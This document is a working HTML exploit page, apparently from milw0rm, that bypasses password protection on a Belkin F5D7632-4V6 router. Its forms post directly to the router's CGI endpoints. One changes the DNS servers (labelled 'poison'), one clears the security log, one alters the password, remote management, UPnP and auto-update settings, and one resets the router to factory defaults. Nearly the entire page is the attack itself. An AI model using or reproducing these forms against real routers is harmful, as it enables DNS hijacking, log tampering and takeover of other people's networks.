<html>
<head>
</head>
<body>
<b>html code to bypass the webinterface password protection of the Belkin wireless G router + adsl2 modem.<br>
 It worked on model F5D7632-4V6 with upgraded firmware 6.01.08.</b>
<br>
	<form action="http://192.168.2.1/cgi-bin/setup_dns.exe" name=dnspoison method=post>
		Change dns nameservers (ip's can't be the same)<br>
		<input name=page type=hidden value="setup_dns">
		<input name=logout type=hidden value="">
		<input name=auto_from_isp type=hidden value="0">
		<input name=dns1_1 type=text value="1">
		<input name=dns1_2 type=text value="2">
		<input name=dns1_3 type=text value="3">
		<input name=dns1_4 type=text value="4">
		<br>
		<input name=dns2_1 type=text value="1">
		<input name=dns2_2 type=text value="2">
		<input name=dns2_3 type=text value="3">
		<input name=dns2_4 type=text value="5">
		<br>
		<input name=submit type=submit value="poison">
	</form>
	<br>
	<br>
	<form action="http://192.168.2.1/cgi-bin/statusprocess.exe" name=clearlog method=post>
		Clear log file<br>
		<input name=securityclear type=submit value="clear">
	</form>
	<br>
	<br>

	<form ACTION="http://192.168.2.1/cgi-bin/system_all.exe" method=post name=changepassword>
		Change time, pwd(if you have old pwd), remote management, UPnP:)<br>
		and automatic firmware update (nice combined with DNS poisoning)<br>

		<input type="hidden" name="restart_time" value="0">

		<input type="hidden" name="reload" value="1">

		<input type="hidden" name="restart_page" value='document.location.href="system.stm";'>

		<input type="hidden" name="location_page" value="system.stm">

		<input type="hidden" name="server1" value="">

		<input type="hidden" name="server2" value="">

		<!-- for clock -->

		<input type="hidden" name="year" value="">

		<input type="hidden" name="mon" value="">

		<input type="hidden" name="day" value="">

		<input type="hidden" name="hour" value="">

		<input type="hidden" name="min" value="">

		<input type="hidden" name="sec" value="">
		<br>old password<br>

		<input type="password" size="12" maxlength="12" name="userOldPswd" value="">
		<br>new password, twice<br>

		<input type="password" size="12" maxlength="12" name="userNewPswd" value="">

		<input type="password" size="12" maxlength="12" name="userConPswd" value="">
		<br>login timeout (1-99 minutes)<br>

		<input type="text" name="timeout" size="3" maxlength="3" value="10">

		<br>Time and Time Zone:<br>
		daylight saving : <br>

		<input type="checkbox" name="daylight" value="1">timezone(number)<br>

		<input type="text" name="time_zone" value="26">
		<input type="checkbox" name="enable_ntp" value="1">Enable Automatic Time Server Maintenance<br>

		<tr>

			<td width="240">Primary Server</td>

			<td width="360">

				<select name="time1">

				<option>132.163.4.102  - North America</option>

				<option>192.5.41.41    - North America</option>

				<option>192.5.41.209   - North America</option>

				<option>207.200.81.113 - North America</option>

				<option>208.184.49.9   - North America</option>

				<option>129.132.2.21   - Europe</option>

				<option>130.149.17.8   - Europe</option>

				<option>128.250.36.3   - Australia</option>

				<option>137.189.8.174  - Asia Pacific</option>

				</select>
			</td>

		</tr>

		<tr>

			<td width="240">Secondary Server</td>

			<td width="360">

				<select name="time2">

				<option>132.163.4.102  - North America</option>

				<option>192.5.41.41    - North America</option>

				<option>192.5.41.209   - North America</option>

				<option>207.200.81.113 - North America</option>

				<option>208.184.49.9   - North America</option>

				<option>129.132.2.21   - Europe</option>

				<option>130.149.17.8   - Europe</option>

				<option>128.250.36.3   - Australia</option>

				<option>137.189.8.174  - Asia Pacific</option>

				</select>

			</td>

		</tr>
		<br>Remote management: <br>

			<input type="checkbox" name="allow_all" value="1">Any IP address can remotely manage the router<br>
			Only this IP address can remotely manage the router<br>

			<input name="IP1" size="3" maxlength="3" value="0">.

			<input name="IP2" size="3" maxlength="3" value="0">.

			<input name="IP3" size="3" maxlength="3" value="0">.

			<input name="IP4" size="3" maxlength="3" value="0">

			<br>remote port:

			<input name="REMOTEPORT" size="5" maxlength="5" value="0">

			<br>NAT Enabling:<br>

			<input type=radio name=Nat_enable value=1>Enable<br>

			<input type=radio name=Nat_enable value=0>Disable<br>
		<br>UPnP<br>
			<input type="radio" name="upnp_enable" value=1>Enable<br>

			<input type=radio name=upnp_enable value=0>Disable<br>
		<br>Auto Update Firmware Enabling<br>

			<input type="radio" name="autoUpdate_enable" value=1>Enable<br>

			<input type="radio" name="autoUpdate_enable" value=0>disable<br>
	</form>
	
	<form method="POST" action="http://192.168.2.1/cgi-bin/restore.exe" name="RebootForm">
		<br>restore factory defaults (and pw:D)<br>
		<input type="hidden" name="page" value="tools_restore">

		<input type="hidden" name="logout">

		<input type="submit" value="Restore Defaults" style="{width:120px;}" class="submitBtn">

	</form>
</body>
</html>

# milw0rm.com [2008-08-25]